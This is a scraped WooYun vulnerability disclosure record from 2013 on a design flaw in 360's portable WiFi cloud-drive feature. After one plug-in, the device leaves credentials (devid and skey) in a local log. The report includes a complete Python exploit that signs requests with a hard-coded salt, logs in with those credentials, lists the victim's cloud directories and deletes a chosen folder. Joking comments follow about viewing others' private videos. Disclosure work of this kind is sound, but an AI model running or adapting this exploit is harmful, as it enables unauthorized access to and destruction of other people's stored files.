{"id": 6377, "wybug_id": "wooyun-2013-041487", "wybug_title": "360wifi轻插一次可实现永久控制", "wybug_corp": "奇虎360", "wybug_author": "路人甲", "wybug_date": "2013-10-30 17:09", "wybug_open_date": "2014-01-28 17:09", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计不当导致攻击界面扩大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-10-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-10-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-12-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-01-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-28：\t细节向公众公开  简要描述： 360wifi有个神奇的功能叫云U盘。它有个地方设计不当，就是在电脑上插一次之后，会在本地记录该wifi的devid和skey。之后呢？你就能通过该devid和skey任意访问云U盘中的文件了。借一下别人的360wifi，轻插一下你的电脑，然后还给他。然后你就能任意看他云U盘中的岛国电影了 详细说明：  在file://C:\\Users\\用户名\\AppData\\Roaming\\360CloudWifi\\expuser.log路径里，如下：\n\n之后你把这两个值写到以下python文件里。\n#coding=utf-8import urllibimport urllib2import hashlibfrom xml.dom import minidomgetconf_url = \"http://w.yunpan.360.cn/intf.php\";login_url = \"http://w%s.yunpan.360.cn/intf.php?method=WifiUser.login&qid=%s&devtype=Wifi&v=&devid=%s&devname=&rtick=6198368&sign=%s&\"detail_url = \"http://api%s.yunpan.360.cn/intf.php?method=User.getUserDetail&qid=%s&devtype=Wifi&v=1.0.0.1030&devid=%s&devname=&rtick=6211423\";getfile_url = \"http://api%s.yunpan.360.cn/intf.php?method=File.getAllNodesV2&qid=%s&devtype=Wifi&v=1.0.0.1030&devid=%s&devname=&rtick=5350229\";delfile_url = \"http://api%s.yunpan.360.cn/intf.php?method=File.delete&qid=%s&devtype=Wifi&v=1.0.0.1050&devid=%s&devname=&rtick=11609065\";###请将这两个值改成file://C:\\Users\\用户名\\AppData\\Roaming\\360CloudWifi\\expuser.log中的devid和skey###上面的日志如下 /start /devid=xxxxxxxxxxxxxxxxx /skey=bbbbbbbbbbbbbkey = {'skey':'aaaaaaaa'} devid = \"bbbbbbbbbbbbbbbbbbbbbbb\"getConf = {\t'method':'WifiUser.getConfig',\t'qid':'',\t'devtype':'Wifi',\t'devid': devid,\t'devname':'',\t'rtick':'2529285',\t'v':'',\t'sign':''};userLogin = {\t'method':'WifiUser.login',\t'qid':'',\t'devtype':'Wifi',\t'devid':devid,\t'devname':'',\t'rtick':'6198368',\t'v':'',\t'sign':''};def getcontent(page, name):\ti = page.find(name+\"=\")\tmylen = len(page)\tj = i+4\tleft = -1;\tif(i!=-1):\t\tfor k in range(j, len(page)-1):\t\t\tif(page[k]=='\"'and left==-1):\t\t\t\tleft=k+1;\t\t\telif(page[k]=='\"' and left>0):\t\t\t\tright=k\t\t\t\tbreak;\tif(left!=-1):\t\treturn page[left:right]\tdef ksort(d):\tresult=\"\";\tfor k in sorted(d.keys()):\t\tif k!='sign':\t\t\tresult=result+k+'='+d[k]\t#print result\treturn resultdef getsign(data):\tsalt='243dcc291a9d8f31e21c9c580cfdce64'\tdata1=ksort(data)\tdata1 = data1+salt\tsign = hashlib.md5(data1).hexdigest()\t#print \"sign is \"+sign\treturn signdef signurl(url):\tparamlist = url.split(\"?\")\tparams = paramlist[1]\tpv = params.split(\"&\")\tdata = {}\tfor k in pv:\t\tp = k.split(\"=\")\t\tdata[p[0]] = p[1]\treturn getsign(data)\t\tdef login(cid, qid, key):\tuserLogin['qid']=qid;\tsign = getsign(userLogin);\tuserLogin['sign'] = sign;\tlogin_url1 = login_url%(cid, qid, devid, sign)\treq = urllib2.Request(login_url1);\treq.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0')\treq.add_header('Cookie', urllib.urlencode(key))\tresponse = urllib2.urlopen(req);\tpage = response.read()\ttoken = getcontent(page,\"token\")\treturn tokendef detail(cid, qid, devid, token):\tdetail1 = detail_url%(cid,qid, devid)\tsign = signurl(detail1)\tdetail1 = detail1+\"&sign=\"+sign+\"&ofmt=xml&pid=&\";\treq = urllib2.Request(detail1);\treq.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0')\treq.add_header('Cookie', \"token=\"+token)\tresponse = urllib2.urlopen(req);\tpage = response.read()\t\tdef getAllFile(cid, qid, devid, token):\tgetfile = getfile_url%(cid, qid, devid)\tsign = signurl(getfile)\tgetfile = getfile+\"&sign=\"+sign+\"&ofmt=xml&pid=&\";\treq = urllib2.Request(getfile)\treq.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0')\treq.add_header('Cookie', \"token=\"+token+\";count=1000\")\tresponse = urllib2.urlopen(req);\tpage = response.read()\tdata = parseFile(page)\treturn data\t\tdef deleteFile(cid, qid, devid, token, fname):\tdelfile = delfile_url%(cid, qid, devid)\tsign = signurl(delfile)\tdelfile = delfile + \"&sign=\"+sign+\"&ofmt=xml&pid=home&\"\treq = urllib2.Request(delfile)\treq.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0')\treq.add_header('Cookie', \"token=\"+token+\";fname=/\"+fname+\"/\")\tresponse = urllib2.urlopen(req);\tpage = response.read()\tprint page\t\tdef parseFile(page):\tdoc = minidom.parseString(page)\troot = doc.documentElement\tdir_infos = root.getElementsByTagName(\"dir_info\");\t\ti = 0;\tdata = {}\tprint \"directory in the safe 360 yunpan: \"\tfor node in dir_infos:\t\tpid = node.getAttribute(\"pid\")\t\tif pid==\"0\":\t\t\tprint i\t\t\tprint \":\"\t\t\tprint node.getAttribute(\"fname\")\t\t\tdata[i] = node.getAttribute(\"fname\")\t\t\ti=i+1\treturn data\t'''\tproxy_handler = urllib2.ProxyHandler({'http': '127.0.0.1:8081'})opener = urllib2.build_opener(proxy_handler)\t\t\t\turllib2.install_opener(opener) '''sign = getsign(getConf);getConf['sign']=signreq = urllib2.Request(getconf_url+\"?\"+urllib.urlencode(getConf));req.add_header('User-Agent','Mozilla/5.0 (Windows NT 6.1; rv:20.0) Gecko/20100101 Firefox/20.0')req.add_header('Cookie', urllib.urlencode(key)) response = urllib2.urlopen(req);page = response.read()cid = getcontent(page, \"cid\")qid = getcontent(page, \"qid\")token = login(cid, qid, key)data = getAllFile(cid, qid, devid, token)i = int(input(\"which do you want to delete? better choose an english name directory input the number:   \"))deleteFile(cid, qid, devid, token, data[i])\n运行下哈，选择一个你想删除的文件夹，删除吧。代码里有个bug，暂时不支持删除中文文件夹名哦。   漏洞证明：  \n\n   修复方案：  你们更专业   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-10-30 18:24 厂商回复： 感谢反馈。由于攻击者必须拿到随身wifi设备，才能获取云U盘登录信息，因此漏洞评级为低。我们将会在新版中进一步增强登录验证机制，降低此类安全风险。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-10-30 17:10 |    \t\t海绵宝宝 \t\t\t( 普通白帽子  |\t\t\t        Rank:243 漏洞数:50        | 唯有梦想与好姑娘不可辜负.)\t\t \n  插一下又不会怀孕..    \n     2013-10-30 17:13 |    \t\t士大夫 \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:37        | 杭州WEB安全小组)\t\t \n  神奇的路人甲    \n     2013-10-30 17:28 |    \t\tMr.Jen \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 开放自由)\t\t \n  @海绵宝宝 会破处    \n     2013-10-30 17:34 |    \t\tAdra1n \t\t\t( 普通白帽子  |\t\t\t        Rank:437 漏洞数:68        )\t\t \n  神奇的路人甲    \n     2013-10-30 18:01 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  神奇的路人甲     \n     2013-10-30 21:33 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  由此可见TT的重要性。。    \n     2013-10-31 00:25 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  给力的路人甲    \n     2013-10-31 08:39 |    \t\t蛋炒饭 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 秘密)\t\t \n  以后只要丢一个360wifi，人就红了    \n     2013-11-02 18:47 |    \t\tMoogong \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:8        | 伪法医)\t\t \n  岛国电影    \n     2013-11-02 19:11 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  如果账号一致应该是丢一次 永远就同步更新你的小电影了    \n     2013-11-02 20:57 |    \t\tonlycjeg \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:5        | 我就看看,我不说话.)\t\t \n  插一下又不会怀孕..    \n     2013-11-02 23:51 |    \t\t天朝城管 \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:35        | 不要等到命玩你的时候才开始玩命)\t\t \n  求公开 我同位的是个妹子家里就有 嘿嘿 你懂的    \n     2013-11-03 00:28 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  我去年买了表的，我要是卖这东西的，我就呵呵了。    \n     2013-11-03 00:30 |    \t\t想要减肥的胖纸 \t\t\t( 普通白帽子  |\t\t\t        Rank:250 漏洞数:42        )\t\t \n  去京东看看销售量吧，拿个笔记本去京东库房 插一下又不会怀孕。    \n     2013-11-03 17:15 |    \t\t无敌L.t.H \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | ‮……肉肉捉活，亭长放解)\t\t \n  插一下自动刷成OpenWRT。    \n     2013-11-07 08:27 |    \t\t雷锋小号 \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 乌云现在就缺我这种默默顶贴从来不求脸熟的...)\t\t \n  路人甲，神一般的人物    \n     2013-11-07 09:16 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  韩国性感车模林智慧素颜照曝光 似路人甲    \n     2014-01-28 18:59 |    \t\tziwen \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:4        | 活着为了乐还是为了苦？)\t\t \n  呵呵 我会说我插过很多地方了吗    \n     2014-02-19 10:49 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  这都好意思评价个低。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}